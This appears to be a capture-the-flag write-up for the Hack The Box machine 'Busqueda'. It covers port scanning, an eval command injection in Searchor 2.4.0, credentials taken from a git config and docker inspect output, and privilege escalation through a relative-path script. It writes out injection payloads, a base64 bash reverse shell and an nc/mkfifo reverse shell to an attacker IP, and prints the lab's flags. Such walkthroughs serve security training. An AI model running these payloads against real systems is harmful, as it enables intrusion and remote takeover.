# Busqueda
## STEPS:

> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.11.208 --min-rate 1000 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-24 06:54 PDT
Nmap scan report for 10.10.11.208
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.75 seconds
```

1. Based from the result, we know the host is running a web application in Apache version 2.4.52.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/526c63f9-847f-47ed-bd77-601505d93479)


2. Looking at the footer, we know the webapp using Flask and searchor version 2.4.0 (which is outdated) and there are many documentation out there.
3. Telling that this version is vulnerable to **command injection**.

> Documenations

```
https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
```

4. Reading one of the github, it seems the vuln is at:

> The blocked

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1a5046fd-3c43-4817-9098-589e27c710e5)


5. There's a eval usage, which allows us to inject bash command. But we can't just send --> `__import__('os').system('id')`, after tested the feature in normal way, seems we need to add `'` and wrap the python code with `str()`.

> TESTING NORMAL WAY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/677c944e-abcb-4b1a-ae32-60ecc1d11f0c)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/651bc11c-53be-4a88-b50d-367ad49224d4)


> OUR PAYLOAD

```py
') + str(__import__('os').system('id')) #
```

6. What it will look like:

```py
url = eval(Engine.<some_engine>.search('') + str(__import__('os').system('id')) #', copy_url={copy}, open_web={open})")
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/60c5b8bd-f160-4eb2-a9b9-b206961c9dc4)

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/322d7a72-6ea5-414e-97de-030dedb402e3)


7. Long story short, I got the user.txt inside the /home/svc directory.

```
') + str(__import__('os').system('cd .. && cd .. && cd .. && cd home && cd svc && cat user.txt && ls -a')) #
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ce1079fb-52db-4f00-a420-1661b7804100)


## USER FLAG

```
d8ad3edaacebd00c00e4b7c6fbdfbb77
```


8. To get the root flag, we need to do reverse shell first. I used this bash script template:

```sh
bash -i >& /dev/tcp/10.10.14.25/1337 0>&1
```

9. So our payload shall look like this:

```py
') + str(__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS8xMzM3IDA+JjE=|base64 -d|bash')) #
```

10. Now set a listener at port 1337 and send the payload.

> RESULT - GOT SHELL

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ca6c8071-116a-4c3e-88e0-6cf31dc86e88)


11. Well, when traversing to find the user.txt before, I found a .git directory which has a cred at the config file. Also it referencing to gitea.searcher.htb site.

```
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
svc@busqueda:/var/www/app/.git$ 
```

> gitea.searcher.htb -> use -> cody:jh1usoih2bkjaspwe92

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1871d832-3231-4080-8722-511ebd99bed1)



#### NOTES:

```
In short about Gitea:
-> Similar to GitHub or GitLab but more lightweight, easy to install, and consume fewer system resources.
```


12. Nothing interesting here. Anyway i tried to run `sudo -l` to see the sudo permissions for user svc, but resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f7be4e1d-0be1-42ac-8501-5dc4458848c6)


13. To solve this, we need to do login ssh using this cred --> `svc:jh1usoih2bkjaspwe92`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d4cb6819-21de-4b38-98b2-46a98be39809)


14. `/usr/bin/python3 /opt/scripts/system-checkup.py` can be our interest now.

> User only has access to execute.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8499175f-8203-485d-8286-09d3d58b20b2)


15. Things getting more interesting here.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dbf058b9-1555-4074-b24d-749de0a01249)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e608e77c-7bd8-4d2f-8ef6-fab6c714262e)


16. When running "docker-inspect" it asks us to specify the format and the docker name.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3801160f-0e94-4be4-abe2-cc1c4d39d33b)


```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
```

> RESULT

```json
{
  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
  "Created": "2023-01-06T17:26:54.457090149Z",
  "Path": "/usr/bin/entrypoint",
  "Args": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],
  "State": {
    "Status": "running",
    "Running": true,
    "Paused": false,
    "Restarting": false,
    "OOMKilled": false,
    "Dead": false,
    "Pid": 1835,
    "ExitCode": 0,
    "Error": "",
    "StartedAt": "2023-08-24T13:54:14.842187822Z",
    "FinishedAt": "2023-04-04T17:03:01.71746837Z"
  },
  "Image": "sha256:6cd4959e1db11e85d89108b74db07e2a96bbb5c4eb3aa97580e65a8153ebcc78",
  "ResolvConfPath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/resolv.conf",
  "HostnamePath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hostname",
  "HostsPath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hosts",
  "LogPath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb-json.log",                                                                                                             
  "Name": "/gitea",
  "RestartCount": 0,
  "Driver": "overlay2",
  "Platform": "linux",
  "MountLabel": "",
  "ProcessLabel": "",
  "AppArmorProfile": "docker-default",
  "ExecIDs": null,
  "HostConfig": {
    "Binds": [
      "/etc/timezone:/etc/timezone:ro",
      "/etc/localtime:/etc/localtime:ro",
      "/root/scripts/docker/gitea:/data:rw"
    ],
    "ContainerIDFile": "",
    "LogConfig": {
      "Type": "json-file",
      "Config": {}
    },
    "NetworkMode": "docker_gitea",
    "PortBindings": {
      "22/tcp": [
        {
          "HostIp": "127.0.0.1",
          "HostPort": "222"
        }
      ],
      "3000/tcp": [
        {
          "HostIp": "127.0.0.1",
          "HostPort": "3000"
        }
      ]
    },
    "RestartPolicy": {
      "Name": "always",
      "MaximumRetryCount": 0
    },
    "AutoRemove": false,
    "VolumeDriver": "",
    "VolumesFrom": [],
    "CapAdd": null,
    "CapDrop": null,
    "CgroupnsMode": "private",
    "Dns": [],
    "DnsOptions": [],
    "DnsSearch": [],
    "ExtraHosts": null,
    "GroupAdd": null,
    "IpcMode": "private",
    "Cgroup": "",
    "Links": null,
    "OomScoreAdj": 0,
    "PidMode": "",
    "Privileged": false,
    "PublishAllPorts": false,
    "ReadonlyRootfs": false,
    "SecurityOpt": null,
    "UTSMode": "",
    "UsernsMode": "",
    "ShmSize": 67108864,
    "Runtime": "runc",
    "ConsoleSize": [
      0,
      0
    ],
    "Isolation": "",
    "CpuShares": 0,
    "Memory": 0,
    "NanoCpus": 0,
    "CgroupParent": "",
    "BlkioWeight": 0,
    "BlkioWeightDevice": null,
    "BlkioDeviceReadBps": null,
    "BlkioDeviceWriteBps": null,
    "BlkioDeviceReadIOps": null,
    "BlkioDeviceWriteIOps": null,
    "CpuPeriod": 0,
    "CpuQuota": 0,
    "CpuRealtimePeriod": 0,
    "CpuRealtimeRuntime": 0,
    "CpusetCpus": "",
    "CpusetMems": "",
    "Devices": null,
    "DeviceCgroupRules": null,
    "DeviceRequests": null,
    "KernelMemory": 0,
    "KernelMemoryTCP": 0,
    "MemoryReservation": 0,
    "MemorySwap": 0,
    "MemorySwappiness": null,
    "OomKillDisable": null,
    "PidsLimit": null,
    "Ulimits": null,
    "CpuCount": 0,
    "CpuPercent": 0,
    "IOMaximumIOps": 0,
    "IOMaximumBandwidth": 0,
    "MaskedPaths": [
      "/proc/asound",
      "/proc/acpi",
      "/proc/kcore",
      "/proc/keys",
      "/proc/latency_stats",
      "/proc/timer_list",
      "/proc/timer_stats",
      "/proc/sched_debug",
      "/proc/scsi",
      "/sys/firmware"
    ],
    "ReadonlyPaths": [
      "/proc/bus",
      "/proc/fs",
      "/proc/irq",
      "/proc/sys",
      "/proc/sysrq-trigger"
    ]
  },
  "GraphDriver": {
    "Data": {
      "LowerDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34-init/diff:/var/lib/docker/overlay2/bd9193f562680204dc7c46c300e3410c51a1617811a43c97dffc9c3ee6b6b1b8/diff:/var/lib/docker/overlay2/df299917c1b8b211d36ab079a37a210326c9118be26566b07944ceb4342d3716/diff:/var/lib/docker/overlay2/50fb3b75789bf3c16c94f888a75df2691166dd9f503abeadabbc3aa808b84371/diff:/var/lib/docker/overlay2/3668660dd8ccd90774d7f567d0b63cef20cccebe11aaa21253da056a944aab22/diff:/var/lib/docker/overlay2/a5ca101c0f3a1900d4978769b9d791980a73175498cbdd47417ac4305dabb974/diff:/var/lib/docker/overlay2/aac5470669f77f5af7ad93c63b098785f70628cf8b47ac74db039aa3900a1905/diff:/var/lib/docker/overlay2/ef2d799b8fba566ee84a45a0070a1cf197cd9b6be58f38ee2bd7394bb7ca6560/diff:/var/lib/docker/overlay2/d45da5f3ac6633ab90762d7eeac53b0b83debef94e467aebed6171acca3dbc39/diff",                                                                                                                                       
      "MergedDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/merged",
      "UpperDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/diff",
      "WorkDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/work"
    },
    "Name": "overlay2"
  },
  "Mounts": [
    {
      "Type": "bind",
      "Source": "/root/scripts/docker/gitea",
      "Destination": "/data",
      "Mode": "rw",
      "RW": true,
      "Propagation": "rprivate"
    },
    {
      "Type": "bind",
      "Source": "/etc/localtime",
      "Destination": "/etc/localtime",
      "Mode": "ro",
      "RW": false,
      "Propagation": "rprivate"
    },
    {
      "Type": "bind",
      "Source": "/etc/timezone",
      "Destination": "/etc/timezone",
      "Mode": "ro",
      "RW": false,
      "Propagation": "rprivate"
    }
  ],
  "Config": {
    "Hostname": "960873171e2e",
    "Domainname": "",
    "User": "",
    "AttachStdin": false,
    "AttachStdout": false,
    "AttachStderr": false,
    "ExposedPorts": {
      "22/tcp": {},
      "3000/tcp": {}
    },
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
    "Cmd": [
      "/bin/s6-svscan",
      "/etc/s6"
    ],
    "Image": "gitea/gitea:latest",
    "Volumes": {
      "/data": {},
      "/etc/localtime": {},
      "/etc/timezone": {}
    },
    "WorkingDir": "",
    "Entrypoint": [
      "/usr/bin/entrypoint"
    ],
    "OnBuild": null,
    "Labels": {
      "com.docker.compose.config-hash": "e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515",
      "com.docker.compose.container-number": "1",
      "com.docker.compose.oneoff": "False",
      "com.docker.compose.project": "docker",
      "com.docker.compose.project.config_files": "docker-compose.yml",
      "com.docker.compose.project.working_dir": "/root/scripts/docker",
      "com.docker.compose.service": "server",
      "com.docker.compose.version": "1.29.2",
      "maintainer": "maintainers@gitea.io",
      "org.opencontainers.image.created": "2022-11-24T13:22:00Z",
      "org.opencontainers.image.revision": "9bccc60cf51f3b4070f5506b042a3d9a1442c73d",
      "org.opencontainers.image.source": "https://github.com/go-gitea/gitea.git",
      "org.opencontainers.image.url": "https://github.com/go-gitea/gitea"
    }
  },
  "NetworkSettings": {
    "Bridge": "",
    "SandboxID": "2cd1018afea0707dd5eeddd6b871d15674dc889336ff257c4bba89a7f8accb18",
    "HairpinMode": false,
    "LinkLocalIPv6Address": "",
    "LinkLocalIPv6PrefixLen": 0,
    "Ports": {
      "22/tcp": [
        {
          "HostIp": "127.0.0.1",
          "HostPort": "222"
        }
      ],
      "3000/tcp": [
        {
          "HostIp": "127.0.0.1",
          "HostPort": "3000"
        }
      ]
    },
    "SandboxKey": "/var/run/docker/netns/2cd1018afea0",
    "SecondaryIPAddresses": null,
    "SecondaryIPv6Addresses": null,
    "EndpointID": "",
    "Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "IPAddress": "",
    "IPPrefixLen": 0,
    "IPv6Gateway": "",
    "MacAddress": "",
    "Networks": {
      "docker_gitea": {
        "IPAMConfig": null,
        "Links": null,
        "Aliases": [
          "server",
          "960873171e2e"
        ],
        "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
        "EndpointID": "2c29b6b5e18e7b7364e98148b7c15293730b486c9b2ad86b1c027a1a512e31ac",
        "Gateway": "172.19.0.1",
        "IPAddress": "172.19.0.3",
        "IPPrefixLen": 16,
        "IPv6Gateway": "",
        "GlobalIPv6Address": "",
        "GlobalIPv6PrefixLen": 0,
        "MacAddress": "02:42:ac:13:00:03",
        "DriverOpts": null
      }
    }
  }
}
```

17. Got cred which allows us to login as admin at gitea --> `administrator:yuiu1hoiu4i5ho1uh`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2be60647-0270-4a6f-ad66-b1591a598d3f)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5e80d72b-85d1-42c7-a58d-36ae3fdb8123)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f7b1c05f-ee9e-4ad7-9d5a-ce43fbbe8ba5)


18. Finally we can analyze the `system-checkup` source code.
19. Found the vuln here:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/999aec4b-0d19-476c-b4b7-f9634f8c7fa1)


20. Instead of using an absolute path for executing the full-checkup script, it using a relative path. Knowing this, means system-checkup shall executes full-checkup from the directory where system-checkup is executed.

21. Hence let's traverse to `/opt/scripts` so we can execute it.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cb68517e-9e81-4e84-ae38-d3a0a8035295)


22. Great! Now let's make a **fake** full-checkup script which has our payload for privesc.

> PRIVESC TEMPLATE PAYLOAD

```sh
echo -en "#! /bin/bash\nrm /tmp/privesc;mkfifo /tmp/privesc;cat /tmp/privesc|/bin/sh -i 2>&1|nc 10.10.14.25 1337 > /tmp/privesc" > /tmp/full-checkup.sh
```

> Make it executeable

```sh
chmod +x /tmp/full-checkup.sh
```

23. Set listener on port 1337, then execute system-checkup.

```
svc@busqueda:/tmp$ ls
full-checkup.sh
snap-private-tmp
systemd-private-17829a12bc8b4ac8a1e618230932cccd-apache2.service-sW8QB7
systemd-private-17829a12bc8b4ac8a1e618230932cccd-ModemManager.service-KjfjOT
systemd-private-17829a12bc8b4ac8a1e618230932cccd-systemd-logind.service-TcOS07
systemd-private-17829a12bc8b4ac8a1e618230932cccd-systemd-resolved.service-GzJRLa
systemd-private-17829a12bc8b4ac8a1e618230932cccd-systemd-timesyncd.service-0iHEWc
vmware-root_713-4290166671
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4ea9d8a4-919a-487c-b496-6df10a6321ba)



![image](https://github.com/jon-brandy/hackthebox/assets/70703371/246eaf13-4bf0-430b-b4f1-403943bd759e)


## ROOT FLAG

```
28ebc218fd8b925c15389edf5529c21f
```







